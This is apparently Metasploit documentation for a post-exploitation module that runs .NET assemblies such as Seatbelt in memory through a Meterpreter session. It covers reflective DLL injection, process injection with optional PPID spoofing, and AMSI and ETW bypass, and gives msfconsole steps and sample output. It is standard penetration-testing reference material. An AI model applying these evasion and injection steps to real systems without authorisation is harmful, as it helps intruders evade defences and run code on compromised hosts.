# Execute .Net assembly via Meterpreter session

This module executes a .NET Assembly from a Meterpreter session

It uses Reflective DLL injection to load HostingCLRx64.dll needed to run
.NET assembly. This can be done either within the meterpreter session, or
by injecting into a new or existing process.

The unmanaged injected DLL takes care of verifying if the
process has already loaded the CLR, and loads it if necessary. The
version of the CLR to be loaded is determined by parsing of the assembly
provided and searching for a known signature. Then it runs the assembly
from memory.
Before loading the assembly in the context of the CLR, AMSI is bypassed
using the AmsiScanBuffer patching technique.
(https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-1/)

You'll find details at [Execute assembly via Meterpreter session](https://b4rtik.blogspot.com/2018/12/execute-assembly-via-meterpreter-session.html)

## Verification Steps

### Example 1: Run within the same process

  1. Build or download a .NET project
  1. Build project with target framework that is present on the host
  1. Start msfconsole
  1. Do: ```use post/windows/manage/execute_dotnet_assembly```
  1. Do: ```set SESSION sessionid```
  1. Do: ```set TECHNIQUE SELF``` (to run within our own process)
  1. Do: ```set DOTNET_EXE /your/output/folder/SeatBelt.exe```
  1. Do: ```set ARGUMENTS user```
  1. Do: ```run```
  1. The assembly should run.

```
msf5 post(windows/manage/execute_dotnet_assembly) > run

[*] Launching notepad.exe to host CLR...
[+] Process 10628 launched.
[*] Reflectively injecting the Host DLL into 10628..
[*] Injecting Host into 10628...
[*] Host injected. Copy assembly into 10628...
[*] Assembly copied.
[*] Executing...
[*] Start reading output
[+] 
[+] 
[+]                         %&&@@@&&                                                                                  
[+]                         &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
[+]                         &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
[+] %%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
[+] #%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
[+] #%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
[+] #####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
[+] #######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
[+] ###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
[+] #####%######################  %%%..                       @////(((&%%%%%%%################                        
[+]                         &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
[+]                         &%%&&&%%%%%        v0.2.0         ,(((&%%%%%%%%%%%%%%%%%,                                 
[+]                          #%%%%##,                                                                                 
.........
.........
.........
[+]   [*] Use the Mimikatz "dpapi::cred" module with appropriate /masterkey to decrypt
[+] 
[+] 
[+] === Checking for RDCMan Settings Files (Current User) ===
[+] 
[+] 
[+] 
[+] [*] Completed Safety Checks in 11 seconds
[+] 
[*] End output.
[+] Killing process 10628
[+] Execution finished.
[*] Post module execution completed
```

  ## Example 2: Run in existing process

  1. Build or download a .NET project
  1. Build project with target framework that is present on the host
  1. Start msfconsole
  1. Do: ```use post/windows/manage/execute_dotnet_assembly```
  1. Do: ```set SESSION sessionid```
  1. Do: ```set TECHNIQUE INJECT``` (to run within an existing process)
  1. Do: ```set PID 8648```
  1. Do: ```set DOTNET_EXE /your/output/folder/SeatBelt.exe```
  1. Do: ```set ARGUMENTS user```
  1. Do: ```run```
  1. The assembly should inject into process 8648.

  ## Example 3: Run in new process

  1. Build or download a .NET project
  1. Build project with target framework that is present on the host
  1. Start msfconsole
  1. Do: ```use post/windows/manage/execute_dotnet_assembly```
  1. Do: ```set SESSION sessionid```
  1. Do: ```set TECHNIQUE SPAWN_AND_INJECT``` (to run within a new process)
  1. Do: ```set PPID 8648``` (optional PPID spoofing)
  1. Do: ```set PROCESS notepad.exe``` (process to launch)
  1. Do: ```set USETHREADTOKEN false``` (whether to launch the process under the current impersonation context)
  1. Do: ```set DOTNET_EXE /your/output/folder/SeatBelt.exe```
  1. Do: ```set ARGUMENTS user```
  1. Do: ```set KILL true``` (kill the spawned process once the assembly has completed - default: true)
  1. Do: ```run```
  1. The assembly should run.

## Options

```

Module options (post/windows/manage/execute_dotnet_assembly):

   Name        Current Setting         Required  Description
   ----        ---------------         --------  -----------
   AMSIBYPASS  true                    yes       Enable AMSI bypass
   ARGUMENTS                           no        Command line arguments
   DOTNET_EXE  ~/SeatBelt.exe          yes       Assembly file name
   ETWBYPASS   true                    yes       Enable ETW bypass
   SESSION                             yes       The session to run this module on
   Signature   Automatic               yes       The Main function signature (Accepted: Automatic, Main(), Main(string[]))
   TECHNIQUE   SELF                    yes       Technique for executing assembly (Accepted: SELF, INJECT, SPAWN_AND_INJECT)


   When TECHNIQUE is SPAWN_AND_INJECT:

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   PPID                             no        Process Identifier for PPID spoofing when creating a new process (no PPID spoofing if unset)
   PROCESS         notepad.exe      no        Process to spawn
   USETHREADTOKEN  true             no        Spawn process with thread impersonation


   When TECHNIQUE is INJECT:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
   PID                    no        PID  to inject

```

### Advanced options:

```

   Active when TECHNIQUE is SPAWN_AND_INJECT:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
   KILL  true             yes       Kill the launched process at the end of the task

```